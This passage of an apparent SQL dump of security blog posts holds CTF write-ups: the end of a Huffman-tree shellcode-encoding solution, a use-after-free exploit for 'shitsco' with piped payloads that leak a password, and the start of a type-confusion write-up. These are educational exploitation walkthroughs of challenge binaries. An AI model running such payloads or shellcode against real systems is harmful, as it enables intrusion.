end\r\n\r\n  # Break off the address and data\r\n  addr, data = line.split(/:\\s/, 2)\r\n  addr = addr.to_i(16)\r\n\r\n  # Remove the crud\r\n  data.gsub!(/0x/, \'\')\r\n  data.gsub!(/[^a-fA-F0-9]/, \'\')\r\n\r\n  # Get both the qword (64-bit value) and pair of dwords (32-bit values) on that line\r\n  qword = [data].pack(\"H*\").unpack(\"Q\").pop\r\n  dword1 = qword & 0x0FFFFFFFF\r\n  dword2 = (qword >> 32) & 0x0FFFFFFFF\r\n\r\n  # Store them, indexed by the address\r\n  @@qwords[addr] = qword\r\n  @@dwords[addr] = dword1\r\n  @@dwords[addr+4] = dword2\r\nend\r\n\nNow I have a nice address->value mapping for the entire dumped memory. So I can now define a function to read a node:\n\r\ndef get_node(addr)\r\n  node = {}\r\n  node[:addr]  = addr\r\n  node[:left]  = @@qwords[addr + 0x00]\r\n  node[:right] = @@qwords[addr + 0x08]\r\n  node[:value] = @@dwords[addr + 0x10]\r\n  node[:count] = @@dwords[addr + 0x1c]\r\n\r\n  return node\r\nend\r\n\nAnd, starting at the root, re-build the whole tree recursively:\n\r\n@@seqs = {}\r\ndef walk_nodes(addr, seq = \"\")\r\n  node = get_node(addr)\r\n  #print_node(node)\r\n\r\n  if(node[:left] != 0)\r\n    walk_nodes(node[:left], seq + \"0\")\r\n  end\r\n\r\n  if(node[:right] != 0)\r\n    walk_nodes(node[:right], seq + \"1\")\r\n  end\r\n\r\n  if(node[:left] == 0)\r\n    @@seqs[node[:value]] = seq\r\n  end\r\nend\r\n\r\nnode = get_node(ROOT)\r\nwalk_nodes(ROOT)\r\n\nIn the end, @@seqs looks like this:\n\r\n0 => 0\r\n255 => 1000\r\n215 => 100100000000\r\n177 => 100100000001\r\n30 => 10010000001\r\n56 => 1001000001\r\n220 => 100100001\r\n114 => 10010001\r\n7 => 1001001\r\n133 => 10010100\r\n97 => 10010101\r\n...\r\n\nNow that I have a mapping, I can do a bunch of lookups for the shellcode of my choice:\n\r\ntree_code = \"\"\r\n\r\nSHELLCODE.split(//).each do |c|\r\n  tree_code += @@seqs[c.ord]\r\nend\r\n\r\nwhile((tree_code.length % 8) != 0) do\r\n  tree_code += \'0\'\r\nend\r\ntree_code = [tree_code].pack(\"B*\")\r\ntree_code = [tree_code.length].pack(\"I\") + tree_code\r\ntree_code.split(//).each do |b|\r\n  print(\'\\x%02x\' % b.ord)\r\nend\r\nputs()\r\n\nAnd I\'m done! I have a compressed version of my shellcode that I can feed directly into the program:\n\\x89\\x00\\x00\\x00\\xd7\\x5f\\x67\\xae\\xbe\\x35\\xd7\\xdf\\x0d\\x75\\xfe\\x09\\x7d\\x75\\xf6\\x75\\x13\\xba\\xc3\\x51\\x33\\xd4\\x55\\x44\\xfc\\xea\\x91\\x51\\x3d\\x0d\\x83\\xc3\\xf5\\xd1\\x7e\\xd9\\xeb\\xaf\\xbe\\x17\\xd7\\x5f\\xe0\\x98\\xb3\\x7f\\x0f\\x8e\\xab\\xbb\\x2d\\x9a\\xfb\\xaa\\xee\\xea\\x0c\\xfc\\xd7\\xdd\\x57\\xc7\\xd5\\x48\\x7e\\x9e\\x03\\xaf\\x6c\\x0a\\x89\\xe2\\xaa\\x46\\x2d\\x76\\xc3\\x51\\x35\\x36\\xc1\\xe1\\xfa\\xf5\\xd7\\xdf\\x0a\\x89\\xc0\\xa8\\xad\\x47\\x55\\x51\\x33\\x16\\xc1\\xe1\\xfa\\xf9\\x6f\\x86\\xba\\xf8\\xae\\x22\\xb8\\x8a\\x8a\\xaa\\x46\\xb0\\x7c\\x0b\\x81\\x6d\\x39\\xfe\\x5e\\x05\\x47\\x57\\xad\\xf3\\x20\\x78\\xeb\\x88\\xdf\\x6c\\x35\\x13\\xc0\\x6c\\x1e\\x1f\\xac\nConclusion: my 118 bytes of shellcode compresses down to a clean 142 bytes. :)\nSummary\nSo, once you figure it out, this level is actually pretty straight forward!\nBasically, read its own binary, build a Huffman Tree, then use the user\'s input to walk that Huffman Tree to build the executable code to run. Or, in other words, decompress and run the shellcode that we send!', '\'Defcon Quals 2014\', \'Hacking\', \'Reverse Engineering\'', 'https://blog.skullsecurity.org/2014/defcon-quals-writeup-for-byhd-reversing-a-huffman-tree');
INSERT INTO `skullsecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (22, 'Defcon Quals writeup for Shitsco (use-after-free vuln)', 'Ron Bowes', '2014-5-21', 'Hey folks,\nApparently this blog has become a CTF writeup blog! Hopefully you don\'t mind, I still try to keep all my posts educational.\nAnyway, this is the first of two writeups for the Defcon CTF Qualifiers (2014). I only completed two levels, both of which were binary reversing/exploitation! This particular level was called \"shitsco\", and was essentially a use-after-free vulnerability. You can download the level, as well as my annotated IDA file, here.\n\nThe setup\nBased on the name, it\'ll be no surprise that the program itself looks like a Cisco router UI. You run the executable, and it prints stuff to stdout:\n\r\n$ ./shitsco\r\n\r\n oooooooo8 oooo        o88    o8\r\n888         888ooooo   oooo o888oo  oooooooo8    ooooooo     ooooooo\r\n 888oooooo  888   888   888  888   888ooooooo  888     888 888     888\r\n        888 888   888   888  888           888 888         888     888\r\no88oooo888 o888o o888o o888o  888o 88oooooo88    88ooo888    88ooo88\r\n\r\nWelcome to Shitsco Internet Operating System (IOS)\r\nFor a command list, enter ?\r\n$ ?\r\n==========Available Commands==========\r\n|enable                               |\r\n|ping                                 |\r\n|tracert                              |\r\n|?                                    |\r\n|shell                                |\r\n|set                                  |\r\n|show                                 |\r\n|credits                              |\r\n|quit                                 |\r\n======================================\r\nType ? followed by a command for more detailed information\r\n\nYou can do a lot of interesting stuff, but the most interesting things are:\n\nenable - prompts for a password to elevate privileges (and matches it to the password in /home/shitsco/password, which is read (and stored in memory - this is important later) when the program executes)\nset - sets and unsets named variables\nshow - shows variables that have been set\nflag - a hidden command that can be run after \'enable\' that prints out the flag\n\nI started by reversing a lot of the commands. I won\'t go into too much detail on the assembly here, but suffice to say that many of the commands are boring (\"credits\", \"quit\", \"shell\", and \"?\" for example), and some are somewhat interesting (\"ping\" and \"tracert\", for example, let you provide a single command-line argument to the ping and traceroute programs respectively). But since exec() was being used, there was no shell injection issue. I spent some time reading the manpage for ping and tracert to see if there was any way I could get them to read from a file, but I didn\'t see anything (since they\'re setuid, the likelihood of having a real issue at this point should be pretty low).\nOne of my first suspicions was the set/unset functionality, because heap overflow / linked list issues are so damn common in CTFs. It turns out that wasn\'t the issue, but the issue was indeed in the set/unset functionality!\nPlaying with the binary\nThe first thing I noticed was weird behaviour when I set and unset stuff. Here is how it should look:\n\r\n$ ./shitsco\r\n oooooooo8 oooo        o88    o8\r\n888         888ooooo   oooo o888oo  oooooooo8    ooooooo     ooooooo\r\n 888oooooo  888   888   888  888   888ooooooo  888     888 888     888\r\n        888 888   888   888  888           888 888         888     888\r\no88oooo888 o888o o888o o888o  888o 88oooooo88    88ooo888    88ooo88\r\n\r\n$ set a aaa\r\n$ set b bbb\r\n$ set c ccc\r\n$ show\r\na: aaa\r\nb: bbb\r\nc: ccc\r\n$ set b <-- Unset \'b\'\r\n$ show\r\na: aaa\r\nc: ccc\r\n$ set c <-- Unset \'c\'\r\n$ show\r\na: aaa\r\n$ set d ddd\r\n$ set e eee\r\n$ show\r\na: aaa\r\nd: ddd\r\ne: eee\r\n\nNote that as we add to the list, they are sorted top to bottom. When you remove them from the list, they are no longer shown (obviously). When you add more stuff to the list, it keeps adding to the bottom. That\'s expected!\nBut look at what happens if we free \'a\' and add something else:\n\r\n$ ./shitsco\r\n\r\n oooooooo8 oooo        o88    o8\r\n888         888ooooo   oooo o888oo  oooooooo8    ooooooo     ooooooo\r\n 888oooooo  888   888   888  888   888ooooooo  888     888 888     888\r\n        888 888   888   888  888           888 888         888     888\r\no88oooo888 o888o o888o o888o  888o 88oooooo88    88ooo888    88ooo88\r\n\r\n$ set a aaa\r\n$ set b bbb\r\n$ show\r\na: aaa\r\nb: bbb\r\n$ set a\r\n$ show\r\nb: bbb\r\n$ set c ccc\r\n$ show\r\nc: ccc\r\nb: bbb\r\n\nWait a minute... how did \'ccc\' wind up at the top of the list? What happens if we add something else?\n\r\n$ set d ddd\r\n$ show\r\nc: ccc\r\nb: bbb\r\nd: ddd\r\n\nIt adds to the... end?\nWe\'re starting to see some odd behaviour! Let\'s look at another weird case:\n\r\n$ ./shitsco\r\n\r\n oooooooo8 oooo        o88    o8\r\n888         888ooooo   oooo o888oo  oooooooo8    ooooooo     ooooooo\r\n 888oooooo  888   888   888  888   888ooooooo  888     888 888     888\r\n        888 888   888   888  888           888 888         888     888\r\no88oooo888 o888o o888o o888o  888o 88oooooo88    88ooo888    88ooo88\r\n\r\n$ set a aaa\r\n$ set b bbb\r\n$ set c ccc\r\n$ show\r\na: aaa\r\nb: bbb\r\nc: ccc\r\n$ set c 321 <-- edit \'c\'\r\n$ show\r\na: aaa\r\nb: bbb\r\nc: 321\r\n$ set a\r\n$ show\r\nb: bbb\r\nc: ccc\r\n$ set b 123 <-- edit \'b\'.. or not?\r\n$ show\r\nb: 123\r\nb: bbb\r\nc: ccc\r\n\nWe were able to end up with two \'b\' entries... that\'s not right!\nI\'ll show you one more odd example:\n\r\n$ ./shitsco\r\n\r\n oooooooo8 oooo        o88    o8\r\n888         888ooooo   oooo o888oo  oooooooo8    ooooooo     ooooooo\r\n 888oooooo  888   888   888  888   888ooooooo  888     888 888     888\r\n        888 888   888   888  888           888 888         888     888\r\no88oooo888 o888o o888o o888o  888o 88oooooo88    88ooo888    88ooo88\r\n\r\n$ set a aaa\r\n$ set b bbb\r\n$ set c ccc\r\n$ set a\r\n$ set b\r\n$ set c\r\n$ show\r\n?: (null)\r\n$ show\r\nd: ddd\r\n?: (null)\r\n$ set e eee\r\n$ show\r\nd: ddd\r\ne: eee\r\ne: eee\r\ne: eee\r\ne: eee\r\ne: eee\r\n...forever\r\n\nThat\'s the weirdest one! We got a \'null\' in the list, and we wound up in an infinite loop!\nSomething I should have noticed, but didn\'t at the time, was that this odd behaviour only happens when a) you remove the first element, and b) there was at least one element after it. Quite honestly, I was never able to reliably figure out how to trigger the odd behaviour till I started reversing.\nThe vulnerability\nBefore we get to the actual vulnerability, let\'s talk a bit about the architecture of the code.\nWithout whipping out the disassembler just yet, we can assume that this is implemented with a linked list. Why? Because we were able to get an infinite loop, which means something is pointing back at itself.\nIn actuality, the code bears out. It is indeed a linked list (a doubly-linked list, in fact) with four fields:\n\r\ntypedef struct {\r\n  char *name;\r\n  char *value;\r\n  void *prev;\r\n  void *next;\r\n}\r\n\nWhen you add a new entry, there is only one possibility: it walks the list to the end, then sets the \'next\' pointer appropriately.\nWhen you remove an entry, there are three possibilities: the end of the list, the middle, or the start. The code for doing this is extremely confusing, but the three things that can happen are:\nEnd of the list: it frees it and sets the previous pointer\'s \'next\' to NULL. Note that if there\'s only one entry, this always happens!\nMiddle of the list: it frees it, and sets the previous next and next previous pointers appropriately\nBeginning of the list: it frees it, and fails to set the \'previous\' pointer properly. The head pointer still points to the freed memory!  That leads directly to a use after free vulnerability!\nWhen we remove the first entry (freeing 16 bytes) then add a new one (which requires 16 bytes), the new entry just happens to get allocated in the same memory where the first entry used to be, and everything works just fine. However, if 16 bytes gets allocated in the interim, and we control those bytes, it means we can fully control the \'head\' entry!\nOne gotcha: The data for the two entries needs to be 16 bytes long in order for this attack to work out. I discovered by trial and error, and it\'s simply the nature of how the malloc()s and free()s are ordered, as well as the size of the entry structure (which is also 16 bytes). I\'m sure there are other ways to arrange things, of course, this is the fun of heap attacks!\nThe exploit\nLet\'s first try a proof-of-concept: we\'ll make it allocate 16 \'A\'s, which in theory should take the place of the freed structure:\n\r\n oooooooo8 oooo        o88    o8\r\n888         888ooooo   oooo o888oo  oooooooo8    ooooooo     ooooooo\r\n 888oooooo  888   888   888  888   888ooooooo  888     888 888     888\r\n        888 888   888   888  888           888 888         888     888\r\no88oooo888 o888o o888o o888o  888o 88oooooo88    88ooo888    88ooo88\r\n\r\nWelcome to Shitsco Internet Operating System (IOS)\r\nFor a command list, enter ?\r\n$ set a aaaaaaaaaaaaaaaa\r\n$ set b bbbbbbbbbbbbbbbb\r\n$ set a\r\n$ set b\r\n$ set c AAAAAAAAAAAAAAAA\r\n$ show\r\nc: AAAAAAAAAAAAAAAA\r\nSegmentation fault\r\n\nBeautiful! We added \'aaaaaaaaaaaaaaaa\' and \'bbbbbbbbbbbbbbbb\', then freed them both (as I mentioned earlier, we have to empty out the list). Then we add \'c\' with the value of \'AAAAAAAAAAAAAAAA\', which should take over the memory that the list\'s \'head\' points to. We, therefore, expect that the name, the value, the previous, and the next pointers all point to 0x41414141, so it\'s crashing when trying to dereference one of them.\nAnd sure enough, we can verify with a debugger (I used a string with four different values so we can see what\'s happening):\n\r\n$ gdb -q ./shitsco\r\nReading symbols from /home/ron/defcon-ctf-2014/shitsco/shitsco...(no debugging symbols found)...done.\r\n(gdb) run\r\nStarting program: /home/ron/defcon-ctf-2014/shitsco/./shitsco\r\n\r\n oooooooo8 oooo        o88    o8\r\n888         888ooooo   oooo o888oo  oooooooo8    ooooooo     ooooooo\r\n 888oooooo  888   888   888  888   888ooooooo  888     888 888     888\r\n        888 888   888   888  888           888 888         888     888\r\no88oooo888 o888o o888o o888o  888o 88oooooo88    88ooo888    88ooo88\r\n\r\nWelcome to Shitsco Internet Operating System (IOS)\r\nFor a command list, enter ?\r\n$ set a aaaaaaaaaaaaaaaa\r\n$ set b bbbbbbbbbbbbbbbb\r\n$ set a\r\n$ set b\r\n$ set c AAAABBBBCCCCDDDD\r\n$ show\r\nc: AAAABBBBCCCCDDDD\r\n\r\nProgram received signal SIGSEGV, Segmentation fault.\r\n0x08048e98 in ?? ()\r\n(gdb) x/i $eip\r\n=> 0x8048e98:   mov    eax,DWORD PTR [ebx]\r\n(gdb) print/x $ebx\r\n$1 = 0x43434343\r\n\nExcellent! It\'s crashing when reading the \'next\' pointer! That means we need to construct an appropriate struct in memory that we can point to. Or... we can just use the \'head\' entry, which happens to be at 0x0804C36C. This will cause an infinite loop, but I\'m okay with that.\nI\'m sick of typing manually, plus we want to start using some non-ascii characters, so let\'s do it all on the commandline:\n\r\n$ echo -ne \'set a aaaaaaaaaaaaaaaa\\nset b bbbbbbbbbbbbbbbb\\nset a\\nset b\\nset c AAAABBBB\\x6c\\xc3\\x04\\x08DDDD\\nshow\\n\' | ./shitsco\r\n\r\n oooooooo8 oooo        o88    o8\r\n888         888ooooo   oooo o888oo  oooooooo8    ooooooo     ooooooo\r\n 888oooooo  888   888   888  888   888ooooooo  888     888 888     888\r\n        888 888   888   888  888           888 888         888     888\r\no88oooo888 o888o o888o o888o  888o 88oooooo88    88ooo888    88ooo88\r\n\r\nWelcome to Shitsco Internet Operating System (IOS)\r\nFor a command list, enter ?\r\n$ $ $ $ $ $ c: AAAABBBBlDDDD\r\nSegmentation fault (core dumped)\r\n\nUsing a debugger to check out the crash:\n\r\n$ gdb -q ./shitsco ./core\r\nReading symbols from /home/ron/defcon-ctf-2014/shitsco/shitsco...(no debugging symbols found)...done.\r\n\r\nCore was generated by `./shitsco\'.\r\nProgram terminated with signal 11, Segmentation fault.\r\n#0  0xf75e2b75 in vfprintf () from /lib32/libc.so.6\r\n(gdb) x/i $eip\r\n=> 0xf75e2b75 <vfprintf+21189>: repnz scas al,BYTE PTR es:[edi]\r\n(gdb) print/x $edi\r\n$1 = 0x42424242\r\n\nWe can see from this that it crashed in vfprintf() while reading 0x42424242 - that\'s \"BBBB\". Sweet!\nNow the last step: I want to read the password, so I can use \'enable\'. So I set the commandline to 0x0804C3A0, which is the address of the password in memory. I also pipe into \"head\" because it causes an infinite loop:\n\r\n$ echo -ne \'set a aaaaaaaaaaaaaaaa\\nset b bbbbbbbbbbbbbbbb\\nset a\\nset b\\nset c AAAA\\xa0\\xc3\\x04\\x08\\x6c\\xc3\\x04\\x08DDDD\\nshow\\n\' | ./shitsco | head -n12\r\n\r\n oooooooo8 oooo        o88    o8\r\n888         888ooooo   oooo o888oo  oooooooo8    ooooooo     ooooooo\r\n 888oooooo  888   888   888  888   888ooooooo  888     888 888     888\r\n        888 888   888   888  888           888 888         888     888\r\no88oooo888 o888o o888o o888o  888o 88oooooo88    88ooo888    88ooo88\r\n\r\nWelcome to Shitsco Internet Operating System (IOS)\r\nFor a command list, enter ?\r\n$ $ $ $ $ $ c: AAAA?lDDDD\r\n: this_is_the_password\r\n\nWe got the password!! From there, all you have to do is use \'enable\', then \'flag\' to get the flag.\nSummary\nEssentially, this was a use-after-free bug. If you de-allocated the first entry, the \'head\' pointer wasn\'t updated and still pointed at freed memory. If you can allocate new memory of the same size, it\'ll take the place of the head structure and give the attacker some control over the name, value, next, and previous pointers. In theory, we could almost certainly use this for an arbitrary memory write, but in the context of this challenge it\'s enough to read the password from memory.\nThis is the first time I\'ve seen a use-after-free issue in a CTF, so it was really cool to see it!', '\'Defcon Quals 2014\', \'Hacking\'', 'https://blog.skullsecurity.org/2014/defcon-quals-writeup-for-shitsco-use-after-free-vuln');
INSERT INTO `skullsecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (23, 'PlaidCTF writeup for Pwn-275 – Kappa (type confusion vuln)', 'Ron Bowes', '2014-4-18', 'Hey folks,\nThis is my last writeup for PlaidCTF! You can get a list of all my writeups here. Kappa is a 275-point pwnable level called Kappa, and the goal is to capture a bunch of Pokemon and make them battle each other!\nUltimately, this issue came down to a type-confusion bug that let us read memory and call arbitrary locations. Let\'s see why!\n\nThe setup\nWhen you run Kappa, you get a Pokemon interface:\n\r\nThank you for helping test CTF plays Pokemon! Keep in mind that this is currently in alpha which means that we will only support one person playing at a time. You will be provided with several options once the game begins, as well as several hidden options for those true CTF Plays Pokemon fans ;). We hope to expand this in the coming months to include even more features!  Enjoy! :)\r\nChoose an Option:\r\n1. Go into the Grass\r\n2. Heal your Pokemon\r\n3. Inpect your Pokemon\r\n4. Release a Pokemon\r\n5. Change Pokemon artwork\r\n\nIf you go into the grass, you can capture a Pokemon:\n\r\n1   \r\nYou walk into the tall grass!\r\n.\r\n.\r\n.\r\nYou failed to find any Pokemon!\r\nChoose an Option:\r\n1. Go into the Grass\r\n2. Heal your Pokemon\r\n3. Inpect your Pokemon\r\n4. Release a Pokemon\r\n5. Change Pokemon artwork\r\n\r\n1\r\nYou walk into the tall grass!\r\n.\r\n.\r\n.\r\nA wild Kakuna appears!\r\nChoose an Option:\r\n1. Attack\r\n2. Throw Pokeball\r\n3. Run\r\n2\r\nYou throw a Pokeball!\r\nYou successfully caught Kakuna!\r\nWhat would you like to name this Pokemon?\r\nPOKEMON1\r\nChoose an Option:\r\n1. Go into the Grass\r\n2. Heal your Pokemon\r\n3. Inpect your Pokemon\r\n4. Release a Pokemon\r\n5. Change Pokemon artwork\r\n\n...And so on.\nIt\'s worth noting that each of those periods represents a second of waiting. Thus, the first thing to do is to get rid of sleep():\n\r\n@@ -1,5 +1,5 @@\r\n\r\n-kappa:     file format elf32-i386\r\n+kappa-fixed:     file format elf32-i386\r\n\r\n\r\n Disassembly of section .interp:\r\n@@ -1077,19 +1077,35 @@\r\n  8048de9:      c7 04 24 74 98 04 08    mov    DWORD PTR [esp],0x8049874\r\n  8048df0:      e8 9b f7 ff ff          call   8048590 <puts@plt>\r\n  8048df5:      c7 04 24 01 00 00 00    mov    DWORD PTR [esp],0x1\r\n- 8048dfc:      e8 5f f7 ff ff          call   8048560 <sleep@plt>\r\n+ 8048dfc:      90                      nop\r\n+ 8048dfd:      90                      nop\r\n+ 8048dfe:      90                      nop\r\n+ 8048dff:      90                      nop\r\n+ 8048e00:      90                      nop\r\n  8048e01:      c7 04 24 92 98 04 08    mov    DWORD PTR [esp],0x8049892\r\n  8048e08:      e8 83 f7 ff ff          call   8048590 <puts@plt>\r\n  8048e0d:      c7 04 24 01 00 00 00    mov    DWORD PTR [esp],0x1\r\n- 8048e14:      e8 47 f7 ff ff          call   8048560 <sleep@plt>\r\n+ 8048e14:      90                      nop\r\n+ 8048e15:      90                      nop\r\n+ 8048e16:      90                      nop\r\n+ 8048e17:      90                      nop\r\n+ 8048e18:      90                      nop\r\n  8048e19:      c7 04 24 92 98 04 08    mov    DWORD PTR [esp],0x8049892\r\n  8048e20:      e8 6b f7 ff ff          call   8048590 <puts@plt>\r\n  8048e25:      c7 04 24 01 00 00 00    mov    DWORD PTR [esp],0x1\r\n\r\n\n...and so on\nTypes, types, types\nThere are three types of Pokemon in the game: Bird Jesus, Kakuna, and Charizard. You can have up to four Pokemon captured at the same time. There is an array of the Pokemon types:\n\r\n.bss:0804BFC0 pokemon_types   dd 5 dup(?)             ; DATA XREF: sub_8048960+219w\r\n.bss:0804BFC0                                         ; do_heal_pokemon_real+20r ...\r\n.bss:0804BFC0                                         ; A list of pokemon types, 1 2 or 3\r\n\n...and also an array of pointers to the actual Pokemon:\n\r\n.bss:0804BFAC pokemon_pointers dd 5 dup(?)            ; DATA XREF: list_pokemon+1Er\r\n.bss:0804BFAC                                         ; list_pokemon+2Cr ...\r\n                                                      ; A list of pointers to the captured Pokemon\r\n\nThe structures for each Pokemon type are also different, and this is really the key:\n\r\n00000000 pokemon_type_1  struc ; (sizeof=0x888)\r\n00000000 name            db 15 dup(?)\r\n0000000F artwork         db 2153 dup(?)\r\n00000878 health          dd ?                    ; XREF: do_heal_pokemon_real+5Bw ; max = 100\r\n0000087C attack_power    dd ?\r\n00000880 actions         dd ?\r\n00000884 function_status dd ?                    ; XREF: do_inspect_pokemon+79r\r\n00000888 pokemon_type_1  ends\r\n\r\n00000000 pokemon_type_2  struc ; (sizeof=0x214)\r\n00000000 name            db 15 dup(?)\r\n0000000F artwork         db 501 dup(?)\r\n00000204 health          dd ?                    ; XREF: do_heal_pokemon_real+80w\r\n00000208 attack_power    dd ?\r\n0000020C actions         dd ?\r\n00000210 function_status dd ?                    ; XREF: do_inspect_pokemon+A9r\r\n00000214 pokemon_type_2  ends\r\n\r\n00000000 pokemon_type_3  struc ; (sizeof=0x5FC)\r\n00000000 name            db 15 dup(?)            ; XREF: initialize_bird_jesus+18w\r\n0000000F artwork         db 1501 dup(?)          ; XREF: initialize_bird_jesus+32o\r\n000005EC health          dd ?                    ; XREF: do_heal_pokemon_real+36w\r\n000005EC                                         ; initialize_bird_jesus+55w\r\n000005F0 attack_power    dd ?                    ; XREF: initialize_bird_jesus+62w\r\n000005F4 actions         dd ?                    ; XREF: initialize_bird_jesus+48w\r\n000005F8 function_status dd ?                    ; XREF: do_inspect_pokemon+49r\r\n000005F8                                         ; initialize_bird_jesus+6Fw\r\n000005FC pokemon_type_3  ends\r\n\nThe three important fields are artwork, which is a differently sized array for each type, as well as actions and function_status. function_status is particular important, because it\'s a function pointer to the function that displays the Pokemon\'s status. And function pointers are fun. :)\nType confusion\nNow, this is where the vulnerability happens. When you capture your sixth Pokemon, it no longer fits in the static 5-element array and asks you to replace one of your old ones:\n\r\nWhat would you like to name this Pokemon?\r\nchar\r\nCaught char\r\nOh no! you don\'t have any more room for a Pokemon! Choose a Pokemon to replace!\r\nChoose a Pokemon!\r\n1. Bird Jesus\r\n2. Kack1\r\n3. Kack2\r\n4. Kack3\r\n5. Kack4\r\n\nThe problem is, when a Pokemon updates a Pokemon of another type, it forgets to update the type array, and therefore thinks the Pokemon is of the wrong type! Since each type has a different structure, it means that Bad Stuff happens! If we change out a Pokemon then try to display it, this happens:\n\r\nWhat would you like to name this Pokemon?\r\nchar\r\nCaught char\r\nOh no! you don\'t have any more room for a Pokemon! Choose a pokemon to replace!\r\nChoose a Pokemon!\r\n1. Bird Jesus\r\n2. Kack1\r\n3. Kack2\r\n4. Kack3\r\n5. Kack4\r\n2\r\n\r\nChoose an Option:\r\n1. Go into the Grass\r\n2. Heal your Pokemon\r\n3. Inpect your Pokemon\r\n4. Release a Pokemon\r\n5. Change Pokemon artwork\r\n\r\n3\r\nHere are all of the stats on your current Pokemon!\r\nName: Bird Jesus\r\n                   ..-`\"-._\r\n                 ,\'      ,\'`.\r\n               ,f \\   . / ,-\'-.\r\n              \'  `. | |  , ,\'`|\r\n             `.-.  \\| | ,.\' ,-.\\\r\n              /| |. ` | /.\'\"||Y .\r\n             . |_|U_\\.|//_U_||. |\r\n             | j    /   .    \\ |\'\r\n              L    /     \\    .j`\r\n               .  `\"`._,--|  //  \\\r\n               j   `.   ,\'  , \\   L\r\n          ____/      `\"\'     \\ L  |\r\n       ,-\'   ,\'               \\|\'-+.\r\n      /    ,\'                  .    \\\r\n     /    /                     `    `.\r\n    . |  j                       \\     \\\r\n    |F   |                        \'   \\ .\r\n    ||  F                         |   |\\|\r\n    ||  |                         |   | |\r\n    ||  |                         |   | |\r\n    `.._L                         |  ,\' \'\r\n     .   |                        |,| ,\'\r\n      `  |                    \'|||  j/\r\n       `.\'    .             ,\'   /  \'\r\n         \\\\    `._        ,\'    / ,\'\r\n          .\\         ._ ,\'     /,\'\r\n            .  ,   .\'| \\  (   //\r\n            j_|\'_,\'  |  ._\'` / `.\r\n           \' |  |    |   |  Y    `.\r\n    ,.__  `; |  |-\"\"\"^\"\"\"\'  |.--\"\"`\r\n ,--\\   \"\"\" ,    \\  / \\ ,-     \"\"\"\"---.\r\n\'.--`v.=:.-\'  .  L.\"`\"\'\"\\   ,  `.,.._ /`.\r\n     .L    j-\"`.   `\\    j  |`.  \"\'--\"\"`-\'\r\n     / |_,\'    L ,-.|   (/`.)  `-\\.-\'\\\r\n    `-\"\"        `. |     l /     `-\"`-\'\r\n                  `      `- mh\r\n\r\nCurrent Health: 960\r\nAttack Power: 20\r\nAttack: Gust\r\nSegmentation fault (core dumped)\r\n\nWhere did it crash?\n\r\nCore was generated by `./kappa-fixed\'.\r\nProgram terminated with signal 11, Segmentation fault.\r\n#0  0x22272020 in ?? ()\r\n\n0x22272020? That looks like ascii!\n\r\n$ echo -ne \'\\x20\\x20\\x27\\x22\'\r\n  \'\"\r\n\nSpace, space, single quote, double quote. That looks suspiciously like the ascii art we see above! And, in fact, it is! The artwork pointer of the Charizard we just caught overwrote the function_status pointer of the next Pokemon. Then, when we attempted to call function_status, it called some ascii art and crashed.\nHere\'s what the memory layout is, essentially:\n\r\n          [lower addresses]                                                     [higher addresses]\r\n          +--------------------------------------------------------------------------------------+\r\nKakuna:   |name|artworkar|health|power|actions|fcn_status| [...]                                 |\r\n          +----+---------+------+-----+-------+----------+---------------------------------------+\r\n          +----+---------+------+-----+-------+-----------+------+-----+-------+----------+------+\r\nCharizard:|name|artworkartworkartworkartworkartworkartwork|health|power|actions|fcn_status| [...]|\r\n          +----+------------------------------------------+------+-----+-------+----------+------+\r\n          [lower addresses]                                                     [higher addresses]\r\n\nWhen the Kakuna is replaced by a Charizard, the program still thinks that the Pokemon is a charizard. Then, when it calls fcn_status(), it\'s actually calling an address pointer read from the artwork. If you look at the diagram above, you\'ll see that the same place that Kakuna stores its fcn_status pointer, Charizard stores its artwork.\nThe best part is, we can change the artwork! And therefore, we can change what Kakuna thinks is the function pointer! Check this out:\n\r\nChoose an Option:\r\n1. Go into the Grass\r\n2. Heal your Pokemon\r\n3. Inpect your Pokemon\r\n4. Release a Pokemon\r\n5. Change Pokemon artwork\r\n\r\n5\r\nChoose a Pokemon!\r\n1. Bird Jesus\r\n2. char\r\n\r\n3. 1\r\n\r\n4. 1\r\n\r\n5. 1\r\n\r\n2\r\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA